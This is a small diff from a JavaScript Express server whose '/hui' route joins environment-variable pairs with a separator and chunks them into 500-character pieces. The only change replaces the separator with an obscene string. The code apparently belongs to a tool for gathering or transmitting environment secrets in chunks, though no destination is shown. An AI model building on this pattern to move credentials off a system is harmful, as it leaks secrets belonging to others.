@@ -27,7 +27,7 @@ app.post("/hui", (req, res) => {
 
     const envString = Object.entries(env)
       .map((entry) => entry.join("="))
-      .join("$$$###@@@");
+      .join("228huipizda228");
 
     const chunks = lodash.chunk(envString, 500).map((ch) => ch.join(""));
 
